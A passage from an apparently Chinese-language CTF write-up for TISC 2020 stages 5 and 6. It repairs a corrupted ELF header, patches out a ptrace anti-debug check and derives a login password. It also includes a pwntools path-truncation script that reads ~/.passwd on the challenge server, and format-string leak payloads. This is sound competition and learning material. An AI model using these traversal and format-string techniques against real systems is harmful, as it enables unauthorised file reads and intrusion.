Receiving all data: Done <span class="token punctuation">(</span>40B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18644</span><span class="token punctuation">)</span>b<span class="token string">'4zfb2qiyyvti9oikcqcanmivzdn5da2lyf76.ml'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>87B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg port <span class="token number">31090</span>b<span class="token string">' Winner Vegan Dinner...'</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600927046303-s4-10.jpg"><br><strong>Flag:</strong> <code>无显示，自动提交</code></p><h2 id="STAGE-5-Bulletin-Board-System"><a href="#STAGE-5-Bulletin-Board-System" class="headerlink" title="STAGE 5: Bulletin Board System"></a>STAGE 5: Bulletin Board System</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600927209271-s5-0.jpg"><br>这一题提供了一个二进制文件<code>bbs</code>:</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">file</span> bbsbbs: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, too many section <span class="token punctuation">(</span><span class="token number">65535</span><span class="token punctuation">)</span></code></pre><p>对<code>bbs</code>文件进行调试：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./bbsGNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-git<span class="token punctuation">..</span>.<span class="token string">"/stage5/./bbs"</span><span class="token builtin class-name">:</span> not <span class="token keyword">in</span> executable format: File truncatedgef<span class="token operator">></span>  rStarting program:No executable <span class="token function">file</span> specified.Use the <span class="token string">"file"</span> or <span class="token string">"exec-file"</span> command.</code></pre><p>检查文件头，发现头被打乱：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ readelf -h bbsELF Header:  Magic:   7f <span class="token number">45</span> 4c <span class="token number">46</span> 02 01 01 03 00 00 00 00 00 00 00 00  Class:                             ELF64  Data:                              <span class="token number">2</span>'s complement, little endian  Version:                           <span class="token number">1</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span>  OS/ABI:                            UNIX - GNU  ABI Version:                       <span class="token number">0</span>  Type:                              EXEC <span class="token punctuation">(</span>Executable <span class="token function">file</span><span class="token punctuation">)</span>  Machine:                           Advanced Micro Devices X86-64  Version:                           0x1  Entry point address:               0x400a60  Start of program headers:          <span class="token number">64</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>  Start of section headers:          <span class="token number">65535</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>  Flags:                             0x0  Size of this header:               <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Size of program headers:           <span class="token number">56</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Number of program headers:         <span class="token number">6</span>  Size of section headers:           <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Number of section headers:         <span class="token number">65535</span>  Section header string table index: <span class="token number">65535</span> <span class="token punctuation">(</span><span class="token number">3539421402</span><span class="token punctuation">)</span>readelf: Error: Reading <span class="token number">4194240</span> bytes extends past end of <span class="token function">file</span> <span class="token keyword">for</span> section headers</code></pre><p>参考了<a href="https://binaryresearch.github.io/2020/01/15/Analyzing-ELF-Binaries-with-Malformed-Headers-Part-3-Solving-A-Corrupted-Keygenme.html">这篇文章的分析</a>，这里应该使用了<a href="https://dustri.org/b/screwing-elf-header-for-fun-and-profit.html"> ELF Screwer tool </a>来破坏头中的<code>e_shoff</code> <code>e_shnum</code> <code>e_shstrndx</code>字段值。为了修复进调试，编写修复脚本,生成修复后的文件<code>repaired_bbs</code>:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token keyword">from</span> lepton <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../bbs"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        elf_file <span class="token operator">=</span> ELFFile<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token comment"># overwrite fields values with 0x00 bytes</span>    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shoff"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shentsize"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shnum"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shstrndx"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment"># output to file</span>    binary <span class="token operator">=</span> elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> elf_file<span class="token punctuation">.</span>file_buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../repaired_bbs"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>对<code>repaired_bbs</code>进行调试：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./repaired_bbsGNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-git<span class="token punctuation">..</span>.Reading symbols from ./repaired_bbs<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.gef<span class="token operator">></span>  rStarting program: /vagrant/ctfs/tisc/stage5/repaired_bbs<span class="token punctuation">[</span>Inferior <span class="token number">1</span> <span class="token punctuation">(</span>process <span class="token number">15994</span><span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>但是文件依然没有执行成功，而是直接退出。检查<code>strace</code>，看看是否存在反调试机制：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">strace</span> -f ./repaired_bbsexecve<span class="token punctuation">(</span><span class="token string">"./repaired_bbs"</span>, <span class="token punctuation">[</span><span class="token string">"./repaired_bbs"</span><span class="token punctuation">]</span>, 0x7ffdae1cba08 /* <span class="token number">27</span> vars */<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>brk<span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                               <span class="token operator">=</span> 0x2185000brk<span class="token punctuation">(</span>0x21861c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21861c0arch_prctl<span class="token punctuation">(</span>ARCH_SET_FS, 0x2185880<span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token number">0</span>uname<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>sysname<span class="token operator">=</span><span class="token string">"Linux"</span>, <span class="token assign-left variable">nodename</span><span class="token operator">=</span><span class="token string">"kali"</span>, <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>readlink<span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span>, <span class="token string">"/stage5/repair"</span><span class="token punctuation">..</span>., <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">38</span>brk<span class="token punctuation">(</span>0x21a71c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21a71c0brk<span class="token punctuation">(</span>0x21a8000<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21a8000access<span class="token punctuation">(</span><span class="token string">"/etc/ld.so.nohwcap"</span>, F_OK<span class="token punctuation">)</span>      <span class="token operator">=</span> -1 ENOENT <span class="token punctuation">(</span>No such <span class="token function">file</span> or directory<span class="token punctuation">)</span>ptrace<span class="token punctuation">(</span>PTRACE_TRACEME<span class="token punctuation">)</span>                  <span class="token operator">=</span> -1 EPERM <span class="token punctuation">(</span>Operation not permitted<span class="token punctuation">)</span>exit_group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                           <span class="token operator">=</span> ?+++ exited with <span class="token number">0</span> +++</code></pre><p>寻找<code>patrace</code>调用：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600928749678-s5-1.jpg"><br>使用NOPs，得到<code>patched_bbs</code>，然后就能进行调试和执行了：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600929033761-s5-2.jpg"></p><pre class="language-shell" data-language="shell"><code class="language-shell">gef<span class="token operator">></span> r██████   █████  ██      ██ ███    ██ ██████  ██████   ██████  ███    ███ █████████   ██ ██   ██ ██      ██ ████   ██ ██   ██ ██   ██ ██    ██ ████  ████ ██     ██████  ███████ ██      ██ ██ ██  ██ ██   ██ ██████  ██    ██ ██ ████ ██ █████ ██      ██   ██ ██      ██ ██  ██ ██ ██   ██ ██   ██ ██    ██ ██  ██  ██ ██    ██      ██   ██ ███████ ██ ██   ████ ██████  ██   ██  ██████  ██      ██ ███████▚▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▞              ██████  ██████  ███████     ██████  ██████   ██████               ██   ██ ██   ██ ██          ██   ██ ██   ██ ██    ██              ██████  ██████  ███████     ██████  ██████  ██    ██              ██   ██ ██   ██      ██     ██      ██   ██ ██    ██              ██████  ██████  ███████     ██      ██   ██  ██████                               Version <span class="token number">0.1</span>.7 <span class="token punctuation">(</span>Alpha<span class="token punctuation">)</span>▗▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▖▘                                                                                                                                     ▝USERNAME:</code></pre><p>尝试登录系统，如果输入错误的账号密码，提示我们用<code>gust</code>账户：</p><pre class="language-txt" data-language="txt"><code class="language-txt">USERNAME: testPASSWORD: testSorry, user accounts will only be available in the Beta.Use account &#39;guest&#39; with the password provided at the back of your BBS PRO CD Case!</code></pre><p>在认证过程中，输入账号密码后，程序流转至<code>check_password</code>函数，检查密码是否最多为<code>0x19</code>字节：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600929715935-s5-4.jpg"><br>对于每个字节，检查是奇数或者偶数索引。如果是偶数索引，取当前密码后4bits并存储，如果是奇数索引,则取前4bits与已经存储的bits合并，生成字节保存为最终构造的密码的一部分，最后与内存中的一个静态值<code>\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36</code>比较：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600930259638-s5-5.jpg"><br>为了生成有效的密码，编写脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">b"\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36"</span>    password <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>        upper <span class="token operator">=</span> i <span class="token operator">>></span> <span class="token number">4</span>        lower <span class="token operator">=</span> i <span class="token operator">&amp;</span> <span class="token number">0xf</span>        complete <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lower <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> upper<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>        password <span class="token operator">+=</span> complete    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Password: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得到gust的密码<code>0011ff2244ffbbaaaa22hhcc</code>后,成功登陆系统：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600930564665-s5-6.jpg"><br>经过分析，<code>View Thread</code>能让我们任意读取系统上的文件。为了读取到<code>~/.passwd</code>，使用<code>starce</code>运行程序：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">cat</span> credentialsguest0011ff2244ffbbaaaa22hhccr10@kali:~/tisc$ <span class="token punctuation">((</span>cat credentials<span class="token punctuation">;</span> <span class="token function">cat</span> -<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">strace</span> ./patched_bbs <span class="token punctuation">)</span>execve<span class="token punctuation">(</span><span class="token string">"./patched_bbs"</span>, <span class="token punctuation">[</span><span class="token string">"./patched_bbs"</span><span class="token punctuation">]</span>, 0x7fffd92a33d0 /* <span class="token number">27</span> vars */<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>brk<span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                               <span class="token operator">=</span> 0x16d2000brk<span class="token punctuation">(</span>0x16d31c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16d31c0arch_prctl<span class="token punctuation">(</span>ARCH_SET_FS, 0x16d2880<span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token number">0</span>uname<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>sysname<span class="token operator">=</span><span class="token string">"Linux"</span>, <span class="token assign-left variable">nodename</span><span class="token operator">=</span><span class="token string">"kali"</span>, <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>readlink<span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span>, <span class="token string">"/stage5/patched"</span><span class="token punctuation">..</span>., <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">46</span>brk<span class="token punctuation">(</span>0x16f41c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16f41c0brk<span class="token punctuation">(</span>0x16f5000<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16f5000<span class="token punctuation">..</span>.write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"SELECT: "</span>, 8SELECT: <span class="token punctuation">)</span>                 <span class="token operator">=</span> <span class="token number">8</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>read<span class="token punctuation">(</span><span class="token number">0</span>, V<span class="token string">"V"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token operator">=</span> <span class="token number">1</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0;33m"</span>, <span class="token number">7</span><span class="token punctuation">)</span>                <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">..</span>.write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"THREAD: "</span>, 8THREAD: <span class="token punctuation">)</span>                 <span class="token operator">=</span> <span class="token number">8</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>read<span class="token punctuation">(</span><span class="token number">0</span>, hello_word<span class="token string">"h"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"e"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"l"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"l"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"o"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"_"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"w"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"o"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"r"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"d"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token operator">=</span> <span class="token number">1</span>access<span class="token punctuation">(</span><span class="token string">"/home/bbs/threads/hello_word.thr"</span>, F_OK<span class="token punctuation">)</span> <span class="token operator">=</span> -1 ENOENT <span class="token punctuation">(</span>No such <span class="token function">file</span> or directory<span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[2J<span class="token entity" title="\33">\33</span>[H"</span>, <span class="token number">7</span><span class="token punctuation">)</span>              <span class="token operator">=</span> <span class="token number">7</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[1;31m"</span>, <span class="token number">7</span><span class="token punctuation">)</span>                <span class="token operator">=</span> <span class="token number">7</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"Thread does not exist! Press ent"</span><span class="token punctuation">..</span>., 50Thread does not exist<span class="token operator">!</span> Press enter to continue<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">50</span>write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>read<span class="token punctuation">(</span><span class="token number">0</span>,</code></pre><p>这里我们可以控制文件名，为了绕过<code>.thr</code>，尝试用长文件名，显示路径被截断：</p><pre class="language-txt" data-language="txt"><code class="language-txt">access(&quot;&#x2F;home&#x2F;bbs&#x2F;threads&#x2F;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, F_OK) &#x3D; -1 ENOENT (No such file or directory)</code></pre><p>有了这个思路，编写完整脚本<code>exploit.py</code>，执行得到falg：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">12123</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"USERNAME: \33[0m"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"PASSWORD: \33[0m"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0011ff2244ffbbaaaa22hhcc"</span><span class="token punctuation">)</span>    <span class="token comment"># Path Truncation Attack</span>    length <span class="token operator">=</span> <span class="token number">254</span>    pathing <span class="token operator">=</span> <span class="token string">b'/home/bbs/threads/'</span>    prefix <span class="token operator">=</span> <span class="token string">b'../'</span>    back_part <span class="token operator">=</span> <span class="token string">b'/.passwd'</span>    slashes <span class="token operator">=</span> <span class="token string">b'/'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pathing<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>back_part<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> prefix <span class="token operator">+</span> slashes <span class="token operator">+</span> back_part    <span class="token comment"># SELECT prompt</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SELECT: \33[0m"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"V"</span><span class="token punctuation">)</span>    <span class="token comment"># Send the path</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"THREAD: \33[0m"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment"># Get the flag.</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x1b[H'</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Flag: %s"</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">$ python exploit.py<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">12123</span>: Done<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flag: TISC20<span class="token punctuation">&#123;</span>m4ngl3d_b4ngl3d_wr4ngl3d<span class="token punctuation">&#125;</span></code></pre><p><strong>Flag:</strong> <code>TISC20&#123;m4ngl3d_b4ngl3d_wr4ngl3d&#125;</code></p><h2 id="STAGE-6-Blind-Boss-Battle"><a href="#STAGE-6-Blind-Boss-Battle" class="headerlink" title="STAGE 6: Blind Boss Battle"></a>STAGE 6: Blind Boss Battle</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600938050247-s6a-0.jpg"></p><p>连接服务器，可以发现字符串漏洞：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">nc</span> fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg <span class="token number">42000</span>Welcome to Anoroc Riga Server  Key-Value Storage Service<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Number of <span class="token function">users</span> pwned today: <span class="token number">5908</span>Function Not Yet ImplementedAAAAAAAA%p %p %p %p %p %p %p0x7fe685d08a03 <span class="token punctuation">(</span>nil<span class="token punctuation">)</span> 0x7fe685d08980 0x55f90fc8d0a0 <span class="token punctuation">(</span>nil<span class="token punctuation">)</span> 0x7fff2fc20690 0x55f90fc8a2e0</code></pre><p>但当使用以下payload时，并没有发现<code>AAAAABBBBB</code>出现在堆栈泄露中：</p><pre class="language-none"><code class="language-none">AAAAABBBBA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAABBBB.0x7f8ea2940a03.(nil).0x7f8ea2940980.0x5647b7e9d0a0.(nil).0x7ffcea9d97d0.0x5647b7e9a2e0.(nil).0x7f8ea277c0b3.0x7f8ea2979620.0x7ffcea9d97d8.0x100000000.0x5647b7e9a100.0x5647b7e9a2e0.0x23f94e9d138646bf.0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0xdc009ba63e6646bf.0xdce40a72934846bf.(nil).(nil).(nil).0x1.0x7ffcea9d97d8.0x7ffcea9d97e8.0x7f8ea297b190.(nil).(nil).0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0x5647b7e9a21e.0x7ffcea9d97c8.0x1c.0x1.0x7ffcea9daf5c.(nil).0x7ffcea9daf61.0x7ffcea9dafa3.</code></pre><p>这说明我们控制的缓冲区在堆里或者其他可写的内存中。为了寻找线索，编写脚本获取更多的输出：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span 